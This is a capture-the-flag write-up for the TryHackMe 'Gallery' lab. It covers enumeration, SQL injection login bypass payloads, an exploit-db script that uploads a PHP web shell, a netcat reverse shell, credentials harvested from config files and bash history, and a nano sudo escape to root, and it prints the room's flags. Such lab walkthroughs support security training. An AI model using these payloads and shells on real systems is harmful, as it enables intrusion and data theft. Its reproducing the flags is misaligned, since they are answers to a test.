## Gallery - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/gallery666)

<i>Our gallery is not very well secured.

Designed and created by Mikaa</i> !

**IP: 10.10.192.6**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Burp Suite, Ffuf, SQLMap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and fuzzing.

  ```
  nmap -sC -sV -T5 -p- 10.10.192.6

  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-open-proxy: Potentially OPEN proxy.
  |_Methods supported:CONNECTION
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  |_http-title: Simple Image Gallery System
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  ```

  ```
  ffuf -u http://10.10.192.6/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  gallery                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 45ms]
  
  ffuf -u http://10.10.192.6/gallery/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 46ms]
  user                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 45ms]
  build                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 48ms]
  report                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 45ms]
  archives                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 45ms]
  database                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 45ms]
  uploads                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 45ms]
  dist                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 59ms]
  classes                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 44ms]
  inc                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 44ms]
  plugins                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 46ms]
  albums                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 44ms]
  schedules               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 46ms]
  ```
  
- When you visit port 8080 you will be redirected to the admin login page.

---

## 🌐 Web Exploitation 

- When I searched for `Simple Image Gallery System`, I found 2 exploits. First I tried SQL Injection, you can check the PoC [here](https://m3n0sd0n4ld.github.io/patoHackventuras/simple-image-gallery-system-10-sql).

- When I tried `'oR sLEeP(10);#` there was a delay. I confirmed it with Burp as well.

  ```
  Request:

  POST /gallery/classes/Login.php?f=login HTTP/1.1
  Host: 10.10.192.6
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 29
  Origin: http://10.10.192.6
  Connection: keep-alive
  Referer: http://10.10.192.6/gallery/login.php
  Cookie: PHPSESSID=1tag32c78uqqivgktnlj39n92c
  Priority: u=0
  
  username=pampu&password=bimbo
  
  Response: 
  
  HTTP/1.1 200 OK
  Date: Thu, 29 May 2025 18:34:26 GMT
  Server: Apache/2.4.29 (Ubuntu)
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Length: 109
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
  
  {"status":"incorrect","last_qry":"SELECT * from users where username = 'pampu' and password = md5('bimbo') "}
  
  447 bytes | 1.054 ms
  
  CONFIRMING TIME BASED SQLI:
  
  Request:
  
  POST /gallery/classes/Login.php?f=login HTTP/1.1
  Host: 10.10.192.6
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 39
  Origin: http://10.10.192.6
  Connection: keep-alive
  Referer: http://10.10.192.6/gallery/login.php
  Cookie: PHPSESSID=1tag32c78uqqivgktnlj39n92c
  Priority: u=0
  
  username='oR sLEeP(10);#&password=bimbo
  
  Response:
  
  HTTP/1.1 200 OK
  Date: Thu, 29 May 2025 18:35:31 GMT
  Server: Apache/2.4.29 (Ubuntu)
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Length: 119
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
  
  {"status":"incorrect","last_qry":"SELECT * from users where username = ''oR sLEeP(10);#' and password = md5('bimbo') "}
  
  457 bytes | 11.054 ms
  ```
  
- Let's try `sqlmap` as well.

  ```
  sqlmap -u "http://10.10.192.6/gallery/classes/Login.php?f=login" --data "username=admin&password=123456" --dbs --batch 

  [19:38:19] [INFO] checking if the injection point on POST parameter 'username' is a false positive
  POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
  sqlmap identified the following injection point(s) with a total of 157 HTTP(s) requests:
  ---
  Parameter: username (POST)
      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: username=admin' AND (SELECT 9650 FROM (SELECT(SLEEP(5)))IdUr) AND 'uVbd'='uVbd&password=123456
  ---
  [19:38:34] [INFO] the back-end DBMS is MySQL
  [19:38:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
  do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
  web server operating system: Linux Ubuntu 18.04 (bionic)
  web application technology: Apache 2.4.29, PHP
  back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
  [19:38:39] [INFO] fetching database names
  [19:38:39] [INFO] fetching number of databases
  [19:38:39] [INFO] retrieved: 
  [19:38:49] [INFO] adjusting time delay to 1 second due to good response times
  2
  [19:38:50] [INFO] retrieved: gallery_db
  [19:39:28] [INFO] retrieved: information_schema
  available databases [2]:
  [*] gallery_db
  [*] information_schema
  ```

- It found 2 databases but it was all it can do. I tried to extract more info with it but I couldn't so I pivoted to another [exploit](https://www.exploit-db.com/exploits/50214).

- When you just read the exploit you can find query for SQLI in order to bypass the login page.

  ```post_data = {"username": "admin' or '1'='1'#", "password": ""}```

- Now use the OR statement, login and let's upload a shell.

- If you run the exploit, it will give you command injection through URL which can be helpful.

  ```
  python3 50214.py 
  TARGET = http://10.10.192.6/gallery/
  Login Bypass
  shell name TagoudsyojxfxwbamjaLetta
  
  protecting user
  
  User ID : 1
  Firsname : Adminstrator
  Lasname : Admin
  Username : admin
  
  shell uploading
  - OK -
  Shell URL : http://10.10.192.6/gallery/uploads/1748544660_TagoudsyojxfxwbamjaLetta.php?cmd=whoami
  
  http://10.10.192.6/gallery/uploads/1748544660_TagoudsyojxfxwbamjaLetta.php?cmd=cat%20/etc/passwd
  [SNIP!]
  
  http://10.10.192.6/gallery/uploads/1748544660_TagoudsyojxfxwbamjaLetta.php?cmd=ls%20-al
  total 48
  drwxr-xr-x  3 www-data www-data  4096 May 29 18:51 .
  drwxr-xr-x 16 www-data www-data  4096 Aug 25  2021 ..
  -rw-r--r--  1 www-data www-data   106 May 29 18:51 1748544660_TagoudsyojxfxwbamjaLetta.php
  -rwxr-xr-x  1 www-data www-data  4450 Aug  9  2021 gallery.png
  -rwxr-xr-x  1 www-data www-data 23318 Sep 11  2020 no-image-available.png
  drwxr-xr-x  6 www-data www-data  4096 Aug  9  2021 user_1
  ```

---

## ⚙️ Shell Access

- When it comes to a reverse shell I uploaded the basic PHP reverse shell from PentestMonkey. If you are using Kali you have it in `/usr/share/webshells/php/`

  ```
  nc -lvnp 4444                   
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.192.6] 57416
  Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
   18:58:31 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Now change it to Putty shell and let's get those flags.

---

## 🧍 User Privilege Escalation

- I found the first flag but couldn't read it. Then I visited a web server directory and found database credentials.

  ```
  www-data@gallery:/var/www/html/gallery$ cat initialize.php 
  <?php
  $dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
  
  if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
  if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
  if(!defined('dev_data')) define('dev_data',$dev_data);
  if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
  if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
  if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
  if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
  ```
  
- Login with MySQL and get the admin hash. No need to crack it at all.

  ```
  www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
  Enter password: 
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MariaDB connection id is 17347
  Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
  
  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
  
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
  
  MariaDB [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | gallery_db         |
  | information_schema |
  +--------------------+
  2 rows in set (0.00 sec)
  
  MariaDB [(none)]> use gallery_db;
  Reading table information for completion of table and column names
  You can turn off this feature to get a quicker startup with -A
  
  Database changed
  MariaDB [gallery_db]> select * from users;
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
  | id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
  |  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1748544660_TagoudsyojxfxwbamjaLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2025-05-29 18:51:54 |
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
  1 row in set (0.00 sec)
  ```
  
- Well, now I spent a lot of time enumerating different stuff, and hint says `Mike's mistake...`. So, at one point I searched for all the files that have `mike` in their name and BINGO!

  ```
  www-data@gallery:/dev/shm$ find / -name *mike* 2>/dev/null
  /home/mike
  /var/backups/mike_home_backup
  
  www-data@gallery:/var/backups$ ls -al
  total 60
  drwxr-xr-x  3 root root  4096 May 29 18:19 .
  drwxr-xr-x 13 root root  4096 May 20  2021 ..
  -rw-r--r--  1 root root 34789 Feb 12  2022 apt.extended_states.0
  -rw-r--r--  1 root root  3748 Aug 25  2021 apt.extended_states.1.gz
  -rw-r--r--  1 root root  3516 May 21  2021 apt.extended_states.2.gz
  -rw-r--r--  1 root root  3575 May 20  2021 apt.extended_states.3.gz
  drwxr-xr-x  5 root root  4096 May 24  2021 mike_home_backup

  www-data@gallery:/var/backups$ cd mike_home_backup/
  www-data@gallery:/var/backups/mike_home_backup$ ls -al
  total 36
  drwxr-xr-x 5 root root 4096 May 24  2021 .
  drwxr-xr-x 3 root root 4096 May 29 18:19 ..
  -rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
  -rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
  -rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
  drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
  -rwxr-xr-x 1 root root  807 May 24  2021 .profile
  drwxr-xr-x 2 root root 4096 May 24  2021 documents
  drwxr-xr-x 2 root root 4096 May 24  2021 images
  ```

- Here's the thing, we couldn't read `.bash_history` in Mike's home directory but here we can hihihi.

  ```
  www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
  cd ~
  ls
  ping 1.1.1.1
  cat /home/mike/user.txt
  cd /var/www/
  ls
  cd html
  ls -al
  cat index.html
  sudo -lb3stpassw0rdbr0xx
  clear
  sudo -l
  exit
  [SNIP!]
  ```

- That took some time lol. Switch to Mike and read the flag. Moving to root escalation now.

---

## 👑 Root Privilege Escalation

- As always, I ran `sudo -l` first and found my way to root.

  ```
  mike@gallery:/var/backups/mike_home_backup$ sudo -l
  Matching Defaults entries for mike on gallery:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User mike may run the following commands on gallery:
      (root) NOPASSWD: /bin/bash /opt/rootkit.sh

  mike@gallery:/opt$ cat rootkit.sh 
  #!/bin/bash
  
  read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
  
  # Execute your choice
  case $ans in
      versioncheck)
          /usr/bin/rkhunter --versioncheck ;;
      update)
          /usr/bin/rkhunter --update;;
      list)
          /usr/bin/rkhunter --list;;
      read)
          /bin/nano /root/report.txt;;
      *)
          exit;;
  esac
  ```
  
- This exploitation is sooooo cool btw! Here, we can't edit the script manually since we don't have permissions. What we can do is to abuse `nano` since the script calls it if we input `read`.
  This exploitation for `nano` you can find on GTFOBins. Run the script as sudo with full paths, type `read`, followed by `CTRL+R CTRL+X` to enter the `Read only mode` and then type `reset; sh 1>&0 2>&0`.

  ```
  mike@gallery:/opt$ sudo /bin/bash /opt/rootkit.sh 
  Would you like to versioncheck, update, list or read the report ? read
  ^R^X
  reset; sh 1>&0 2>&0# whoami 
  
  Command to execute: reset; sh 1>&0 2>&0# whoami                                 
  rootet Help                             ^X Read File
  # cat /root/root.txt                    M-F New Buffer
  THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
  ```
  
- Your terminal will be destroyed since we are in `nano` but you can still do `whoami` and read the flag without any issues.
 
---

## 🏁 Flags

- **User Flag**: `THM{af05cd30bfed67849befd546ef}`
- **Root Flag**: `THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, pretty fun room.`

- What did I learn?
  `New privilege escalation methods.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
